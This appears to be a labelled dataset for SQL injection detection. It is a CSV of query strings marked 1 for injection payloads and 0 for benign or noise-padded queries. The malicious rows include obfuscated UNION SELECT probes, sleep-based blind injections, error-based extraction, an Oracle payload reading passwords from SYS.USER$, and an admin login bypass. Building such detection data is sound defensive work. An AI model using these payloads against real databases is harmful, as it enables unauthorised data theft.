Query,label
SELECT/**/K	$0x9FqNy*/*^*/FROMbuildWHERE fedNOT/*{2M5_*/=/**/'[happen]%',0
SELECT	AVG/*+ AND 0x1 OR 'f'!='f'#&*/(/*k|*/rain )/**/FROM found~H,0
"1""  )   Where (SELECT (SELECT 4180))  =  4180 oR Char  (  0x44  )   OR chAr  (  69  )   OR CHAr  (  97  )   OR cHAr  (  85  )    LIKE  ReGExP_SUBSTRIng  (  RePEAT  (  rIghT  (  CHAr  (  (SELECT (SELECT (SELECT (SELECT 5389))))  )  ,0  )  ,5000000000  )  ,nuLL  )  --",1
"/**/&& 1  LIKE  utl_inaddr.get_host_address   (    (  /*lU*/SELECT DISTINCT/*iL*/ (  PASSWORD/**//**/)  /*OU(*/FROM/**//*;*//**/(/**/ SELECT DISTINCT/**/ (/**//**/PASSW OR D  )  ,/*q*/ROWNUM AS/**/LIMIT FROM SYS.USER$  )   WHERE LIMIT  LIKE  (SELECT 6)/**/  ) /**//**/ )/**/ /**/  && /*(SELECT 4)*/'i'/**//**/=  'i",1
"1' or 0x20c0  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  0x1dcd6500/(SELECT (SELECT (SELECT (SELECT2))))   )    )      )    )    and 'bkcs'  =  'bkcs",1
SELECT/*>KB*/AVG ( growth/*FFMv+EA+I|/s(mH*/) FROM appleSELECTSUM ( rule )/*}gqE%*/,0
"1' oR EXtraCtVAluE  (  (SELECT 1297),cOncAt  (  0X5c,0X7171706a71,  (  sELECt   (  elT  (  (SELECT 1297)  =  1297,1   )    )     )  ,0x717a767a71   )    )    And 'UsNH' lIKe 'uSnH",1
"select LiKe  (  'abcDEFg',upPeR/**//*f_*/(  HEx/*&T*//**/( /*""e*/RanDoMblOb  ( /**/(SELECT 500000000)/(SELECT 2)   )    )    /*Yu*/ )    )    AnD ""%""  LIKE  """,1
"/**/SELECT column_name ( s/*j|j=5X`(SELECT 1)*/) /**/FROM no,former",0
"-5131' /*j??Lp&-*/ ) /*
Ipa~*/  )/**/ /*;d	I_*/ /*3$*/) /*Clt'A;*//**/unionall/**/select 4854,4854,4854,4854,(SELECT 4854),4854,4854/*!tp9d*/ OR /**/(SELECT 0)/**/  AND  /*(SELECT (SELECT (SELECT (SELECT 8))))QB*/""("" NOT LIKE ""(9""/**/OR/**/""e""<>""e""/*7*/OR/*9oK*/False/*!
AL*/ AND/**/ ""I} "" NOT/**/LIKE ""I}/**/<"" OR/*Ms&k*/""]"" NOT LIKE ""]"" OR ""8""<>""8"" AND ""<"" LIKE ""<"" AND True AND ""[r""!=""[r@"" OR ""I33"" NOT LIKE ""I33"" OR 0#.MaR~+NZ/**/+,",1
"1""/*?;qA"";*/and/*.aAp~k8<Ka
/**/+F*/7533/*6*//*8ppOVkA+Wr+b+""*/LIKE/**//*?YTr< && True  &&  True/**/AND True AND True#_T*/7533$(SELECT 4)^""",1
"mari/*"")Mn*/cielo",0
"1 /*y:iPS}a""TV{bL;]j(Tej*/)  /*>*/as/*9IO7g*/nmlm where/**/9872 /*rP6*/LIKE  9872",1
" /**/SELECT * FROM won WHERE/*N)l0z*/luckyIN  ( 'follow', 'gray', 'air' )/**/ ",0
" select * from/*~wSK*/users where id  LIKE/**//**/1 +\+./**/union/**/selectnull,@@VERSION --/*h/**/??!`6Tbi}S*/1",1
"/**//**/ SELECT/*v*/thick, doctor+ ', ' + creature+ ' ' + these+ ', ' + balance AS list  FROM wool",0
SELECT/**/AVG ( raw/**/) FROM to SELECT SUM ( small/*l9-)Z || 0 AND '0o'='0o'#*/)/**/,0
"calle/*(SELECT0x2)r4r.*/pea
defrancia,/*HuTBa*/(SELECT 0x3a),",0
"1%""/**//**/ )/*TvRn *//**//*cTz_*//**/)/**//*b/ OR/*Ev*/""3/"" NOT LIKE ""3/""/**/OR ""A"" NOT LIKE ""A""#?(SELECT/**/9)*//*8KN54*/	/**/)/*@Pp_d/Z*//**/ unionall/*?d*/selectnull,null,null,null,null,null,null,null,null,null--.RU?7R)",1
SELECT TOP/*^0x1~dk*/0x3 * FROM/**/hello,0
"calle/*1 OR ""vxLF"" LIKE ""vxLFA""#Y*/ponte vellas/n,/**/13ed",0
"SELECT/**/{rNv[*/**/FROM/**/goes FETCH FIRST 0x3
ROWS/* OR False#&*/ONLY",0
c//*j*/juan/*|:'-d*/perez arriete/**/1913e,0
1' where0xbd4  LIKE  3028,1
"/*"",l$;4/*/ SELECT mistake,fish,closeFROM plates LEFT JOIN Orders ONmeet.forgottenID =  worried.attention  || DER BY/*|\g1i!- OR 2904 NOT IN (2903,2904,2905)##eZ/*/angle.rocket.N",0
SELECT/*eXX*/announced ( s )/*-*//**/FROM/*ue0t`IUohXgogt20m*/terribleLEFTJOIN,0
-(SELECT 1344)  )   as gqGiWhEre 2545  =  2545 Or 4144  =    (  SeLECT uPpER  (  XmltYPE  (  CHR  (  60  )  ||cHr  (  58  )  ||chr  (  113  )  ||Chr  (  113  )  ||cHR  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SeleCT   (  Case wHen   (  4144  =  4144  )   THEn 1 eLsE 0 enD  )   fROM dual  )  ||cHR  (  113  )  ||ChR  (  122  )  ||CHR  (  118  )  ||cHr  (  122  )  ||cHr  (  113  )  ||ChR  (  62   )    )     )   fRoM duAL  )  --,1
SELECT/*Yzf*/COUNT ( equal/*E;~s8N`3C?0x2]0h*/)/*@evvk	*/FROM suppose,0
"1"" /*.?+m*/) /*<Ea/?It""*//*b/~7*/WHERe	0x2004 /*w+vePEl*/LIKE/*6GKX+;3T~*/ 8196",1
SELECT/**/*/**/FROM man/**//* AND 1 AND True AND True OR False AND True#*/WHEREhave LIKEcloselyhT6|B1,0
SELECT/*E OR 4200 LIKE 4201 AND True#)*/COUNT (/**/dawn )/**//**/FROMdiscuss,0
SELECT/**/B}g WA*/**/FROMneighborhood WHEREteeth/**/IN/*sA>--*/ ( SELECT island FROM warm/*(*/) ,0
"SELECTTOP/*7mZ)K%(SELECT 0x3)*/(SELECT (SELECT (SELECT (SELECT (SELECT
0x3)))))/**/* FROM lift WHERE man LIKE 'pleasure' SELECT/*QfQ 0x8*/#-
* FROM even",0
1'   )    )    rlIke   (  SEleCT   (  cAsEwHeN   (  0x1e09  =  (SELECT 0x1e09)  )   THen (SELECT 0x1) ELse 0x28eND   )    )    AND    (    (   'CzQK' = 'CZqk,1
"SELECT * FROM however/**/FETCH FIRST 0x32/*B6S
d
p)u5JC*/PERCENT ROWS ONLYSELECTTOP 0x3 * FROMbread",0
"-(SELECT 2417)/*SU)?/Yz]Th/**/j*//*e|z;rO*/)/**//**/ unionall/**/select (SELECT 2169),2169,2169,2169,0x879,0x879,2169,2169,2169,2169 AND817  NOT LIKE  818 AND ""o"" <> ""o:""/*BeTYm*/AND/**/""4""/**/LIKE ""4""  && /**/""^;""/*P*/LIKE ""^;"" AND True || (SELECT 1787) <> 1787 AND/*M*/True/**/AND/**/""!FH""/**/LIKE/**/""!FH"" AND/**/True  && /*3;UP */""i@""<>""i@z"" OR ""P""<>""P"" AND ""Mc`w"" NOT LIKE ""Mc`w-""#aa:""!h*",1
"1 /**//*!V6""K*/)    )     )   and 0x1ffd /**/LIKE    ( /**/select count  ( /**/*  )   from/**/sysibm.systables/*Q*/as t1,sysibm.systables as
t2,sysibm.systables/*/  &&  True && '_	' NOT LIKE '_	+' OR FalseOR "";""<>"";"" || ""kP,"" NOT LIKE ""kP,""  && /**/""4"" NOT LIKE ""4(""  &&  ""p:""<>""p:P""  &&  """""" NOT LIKE """"D"" OR 1732=(SELECT 1733)#E$*/as/**/t3/**//*RC!*/)/*c:[:*/ --.mC;<6ZG*we^['",1
"-0x24a3  )   ||MAkE_SeT  (  9354  =  9354,7185  )   AnD   (  9212  =  9212",1
SELECT */**/FROM/**/place WHEREoughtNOTBETWEEN 'belt'/*pnY]-*/&&/*-*i*/'noon',0
"SELECT/**/* FROM/*|D;0x1%=r*/fifteenWHEREstopped/*]t!];(0x1~Hz*/= 'rising' LIMIT3",0
SELECT/*tc]q))*/*/**/FROM master /**/WHEREspace/**/=/*gy(w]sxZM'1}*/graph,0
"-2430'  )  unionall select 5712,5712,5712,5712,5712,5712,5712,5712,(SELECT5712),5712--",1
-5067'   )    )    oR (SELECT 5903)  =    (  'qQpjq'||  (  SeLECt caSE 5903when 5903 THEN (SELECT 1) Else (SELECT (SELECT (SELECT (SELECT 0)))) end FROm rdB$DaTabaSe  )   || 'QzVzQ'  )   aND    (    (   'vKab' = 'vKaB,1
-5995'   )    )    or (SELECT6872)  =  6872and    (    (   'pywh'  LIKE  'pywh,1
"1'+/**//*""_rs*/( /**/select/**/dpkp where/**/4836/**//*uar?'m*/= /**/0x12e4/**/andsleep/**//*pAn{*/( /***/(SELECT (SELECT/**/(SELECT 5)))/**//**//**/)/*(SELECT (SELECT (SELECT (SELECT/*/?8*/9))))=*//*;*/ /**/)/*d/*<n*/W<EQaht?*//**//**/+'",1
"SELECTAVG/*-(SELECT 0x0)|*/(/**/late )/*Z*/FROM/*jdc*/vote",0
aDMIn' --,1
"1/**//**//*D*/)/**/   )    as rcon/*a.o*/where/**/0x1ffe  LIKE  0x1ffe/**/or/**/(SELECT/*ur*/(SELECT (SELECT 0x14a6))) /**/=/**//**//**/ ( /**/select count  (  */**/ )  /**/from/*""!sE8e*/all_users t1,all_users/**/t2,all_users/*z[o^iy*/t3,all_userst4,all_users/*!SFL}*/t5/*R?wh*/ )/*zE*//*0x7~*/--",1
"SELECT MIN/*G/*/( avoid )  AS above/*-@&""Yq%q0xNTI(=,FvBc7*/FROM joined",0
"1,  (  sELEcT   (  caSe wHen   (  7711  =  7711  )   tHeN1 ElsE 7711*  (  sELeCT 7711 FroMiNFormatioN_SCHEMA.ChARaCTer_SETs  )   end   )    )   ",1
SELECT/**/TOP 0x3 * FROM songWHERE shout/*p% AND True AND/**/(SELECT 1)#/<*/= 'young'({,0
"/*u@ip*/ SELECT LOCATE (/*%[bx*/""com"", ""W3Schools.com"", 0x3 )  AS MatchPosition;",0
1  )   ascinw where 0xe94  =  0xe94and 8594  =    (  select 8594frompg_sleep  (  (SELECT 0x5)   )    )   --,1
SELECTCOUNT/*|{*/(/**/author ) FROM/*|F AND (SELECT 776) NOT LIKE 777 AND 7013!=7014#]p-'*/bear,0
DELETE/*ZoOMcX	xcZ*/FROM/*N--(SELECT 0x8)mu8*/seems/**/WHERE/**/cream LIKE/**/'production',0
sELECT PG_slEEP  (  5  )   aND    (    (     (  'QsLr'  LIKE  'qsLr,1
narros/*e/*|)qKVLr AND 753!=754#nBJ*/;*/dematalayeguaqs,0
